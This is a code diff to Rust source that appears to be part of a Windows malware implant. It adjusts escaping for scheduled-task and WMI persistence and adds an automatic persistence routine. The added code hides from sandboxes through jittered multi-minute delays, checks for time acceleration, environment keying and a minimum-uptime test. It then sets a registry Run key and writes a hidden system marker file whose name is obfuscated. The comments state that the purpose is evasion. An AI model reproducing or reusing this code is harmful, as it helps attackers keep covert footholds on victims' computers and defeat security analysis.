@@ -305,6 +305,9 @@ fn persist_scheduled_task(exe_path: &Path) -> Result<String, String> {
     // Random delay between 60-180 seconds for anti-behavioral detection
     let delay_secs = 60 + (get_machine_index() % 120);
 
+    // Escape path for shell execution
+    let exe_escaped = escape_shell_path(exe_str);
+
     // Task command with delay and hidden execution
     let task_cmd = format!(
         r#"cmd.exe /c timeout /t {} /nobreak >nul && start /min "" "{}""#,
@@ -357,6 +360,14 @@ fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
     // Escape backslashes for PowerShell
     let exe_escaped = exe_str.replace("\\", "\\\\");
 
+    // Use raw string for WMI root namespace path to prevent escape sequence interpretation
+    // Note: \r in \root would be interpreted as carriage return without raw string
+    let wmi_root = r"\\.\root\subscription";
+    let cimv2_ns = r"root\cimv2";
+
+    // Escape for WMI CommandLineTemplate (needs extra escaping inside PowerShell string)
+    let exe_wmi_escaped = exe_escaped.replace("\\", "\\\\");
+
     // Random hour for trigger (less predictable)
     let trigger_hour = 8 + (get_machine_index() % 8); // 8am-4pm range
 
@@ -378,8 +389,13 @@ fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
             "$B.Filter=$F;$B.Consumer=$C;",
             "$B.Put()|Out-Null"
         ),
-        wmi_root, event_name, cimv2_ns, trigger_hour,
-        wmi_root, event_name, exe_wmi_escaped,
+        wmi_root,
+        event_name,
+        cimv2_ns,
+        trigger_hour,
+        wmi_root,
+        event_name,
+        exe_wmi_escaped,
         wmi_root
     );
 
@@ -679,4 +695,187 @@ pub fn remove_persistence() -> Result<String, String> {
 #[cfg(not(target_os = "windows"))]
 pub fn remove_persistence() -> Result<String, String> {
     Err("Windows only".to_string())
+}
+
+// ============================================================================
+// Automatic Persistence with Evasion
+// ============================================================================
+
+#[cfg(target_os = "windows")]
+use std::sync::atomic::{AtomicBool, Ordering};
+
+/// Flag to track if automatic persistence has been established
+/// Uses atomic bool for thread-safe access
+#[cfg(target_os = "windows")]
+static AUTO_PERSIST_DONE: AtomicBool = AtomicBool::new(false);
+
+// Auto-persistence timing constants
+#[cfg(target_os = "windows")]
+const AUTO_PERSIST_BASE_DELAY_SECS: u64 = 180; // 3 minutes base delay
+#[cfg(target_os = "windows")]
+const AUTO_PERSIST_JITTER_MAX: usize = 120; // Max jitter in seconds (0-120)
+#[cfg(target_os = "windows")]
+const AUTO_PERSIST_CHUNK_SECS: u64 = 30; // Sleep chunk size in seconds
+#[cfg(target_os = "windows")]
+const AUTO_PERSIST_TIME_ACCEL_THRESHOLD: u64 = 25; // If sleep < this, time acceleration detected
+#[cfg(target_os = "windows")]
+const AUTO_PERSIST_MIN_UPTIME_MS: u64 = 600_000; // 10 minutes minimum uptime
+
+/// Marker file to check if persistence was already established in a previous run
+#[cfg(target_os = "windows")]
+fn get_persistence_marker_path() -> PathBuf {
+    let localappdata = env::var(obfstr!("LOCALAPPDATA").to_string())
+        .unwrap_or_else(|_| "C:\\Users\\Public".to_string());
+    PathBuf::from(format!(
+        "{}\\Microsoft\\Windows\\Caches\\{}.dat",
+        localappdata,
+        obfstr!("syscache")
+    ))
+}
+
+/// Check if persistence marker exists (already persisted in previous run)
+#[cfg(target_os = "windows")]
+fn persistence_marker_exists() -> bool {
+    get_persistence_marker_path().exists()
+}
+
+/// Create persistence marker file
+#[cfg(target_os = "windows")]
+fn create_persistence_marker() {
+    use std::fs;
+    let marker_path = get_persistence_marker_path();
+
+    // Create parent directory if needed
+    if let Some(parent) = marker_path.parent() {
+        let _ = fs::create_dir_all(parent);
+    }
+
+    // Write marker with some random-looking data
+    let marker_data = format!(
+        "{}{}{}",
+        std::process::id(),
+        std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .unwrap_or_default()
+            .as_secs(),
+        get_machine_index()
+    );
+    let _ = fs::write(&marker_path, marker_data.as_bytes());
+
+    // Set hidden attribute
+    let attrib_exe = obfstr!("attrib").to_string();
+    let _ = Command::new(&attrib_exe)
+        .args(&["+h", "+s", marker_path.to_str().unwrap_or("")])
+        .creation_flags(0x08000000)
+        .output();
+}
+
+/// Schedule automatic persistence to be established after a delay
+/// This runs in a background thread and uses timing jitter for evasion
+///
+/// Features:
+/// - Random delay between 3-5 minutes (anti-behavioral)
+/// - Uses registry persistence (most reliable, no UAC)
+/// - Marker file to avoid re-persisting on each run
+/// - Environment keying (anti-sandbox)
+/// - Indirect syscalls for memory operations (if available)
+#[cfg(target_os = "windows")]
+pub fn schedule_auto_persistence() {
+    use std::thread;
+
+    // Check if already done in this session
+    if AUTO_PERSIST_DONE.load(Ordering::SeqCst) {
+        return;
+    }
+
+    // Check if marker exists (persisted in previous run)
+    if persistence_marker_exists() {
+        AUTO_PERSIST_DONE.store(true, Ordering::SeqCst);
+        return;
+    }
+
+    // Spawn background thread for auto-persistence
+    thread::spawn(|| {
+        // ====================================================================
+        // TIMING EVASION: Random delay 3-5 minutes with jitter
+        // ====================================================================
+        // This evades sandboxes that:
+        // 1. Only analyze for short periods (< 3 min)
+        // 2. Accelerate time (we use real-time checks)
+        // 3. Look for immediate persistence behavior
+
+        let jitter_secs = get_machine_index() % AUTO_PERSIST_JITTER_MAX;
+        let total_delay = AUTO_PERSIST_BASE_DELAY_SECS + jitter_secs as u64;
+
+        // Sleep in chunks to avoid detection of long sleep calls
+        // Some sandboxes hook Sleep() and fast-forward
+        let chunks = total_delay / AUTO_PERSIST_CHUNK_SECS;
+        let remainder = total_delay % AUTO_PERSIST_CHUNK_SECS;
+
+        for _ in 0..chunks {
+            // Use real-time validation between chunks
+            let start = std::time::Instant::now();
+            std::thread::sleep(std::time::Duration::from_secs(AUTO_PERSIST_CHUNK_SECS));
+
+            // Anti-time-acceleration check: if sleep completed too fast,
+            // sandbox might be accelerating time - abort
+            if start.elapsed().as_secs() < AUTO_PERSIST_TIME_ACCEL_THRESHOLD {
+                return; // Time acceleration detected, abort persistence
+            }
+        }
+
+        if remainder > 0 {
+            std::thread::sleep(std::time::Duration::from_secs(remainder));
+        }
+
+        // ====================================================================
+        // ENVIRONMENT KEYING: Additional sandbox checks before persistence
+        // ====================================================================
+        if !environment_check() {
+            return; // Sandbox detected, abort silently
+        }
+
+        // Additional check: system uptime should be substantial
+        let uptime_ms = unsafe { winapi::um::sysinfoapi::GetTickCount64() };
+        if uptime_ms < AUTO_PERSIST_MIN_UPTIME_MS {
+            return; // Freshly booted system (< 10 min uptime), likely sandbox
+        }
+
+        // ====================================================================
+        // STEALTH PERSISTENCE: Use registry method (most reliable)
+        // ====================================================================
+        // Registry persistence is chosen because:
+        // 1. No UAC prompt required (HKCU)
+        // 2. More reliable than scheduled tasks
+        // 3. Less monitored than WMI subscriptions
+        // 4. Works on all Windows versions
+
+        // Mark as done first to prevent race conditions
+        AUTO_PERSIST_DONE.store(true, Ordering::SeqCst);
+
+        // Establish persistence
+        if let Ok(_) = establish_persistence(PersistenceMethod::RegistryRun) {
+            // Create marker to avoid re-persisting on next run
+            create_persistence_marker();
+        }
+    });
+}
+
+/// Dummy implementation for non-Windows
+#[cfg(not(target_os = "windows"))]
+pub fn schedule_auto_persistence() {
+    // No-op on non-Windows
+}
+
+// ============================================================================
+// Indirect Syscall Support
+// ============================================================================
+// The actual indirect syscall implementations are in syscalls.rs
+// Here we just re-export the availability check for use in this module
+
+/// Check if indirect syscalls are available
+/// Re-exports the check from syscalls module
+#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
+pub fn is_indirect_syscall_available() -> bool {
+    crate::syscalls::is_indirect_syscall_available()
 }
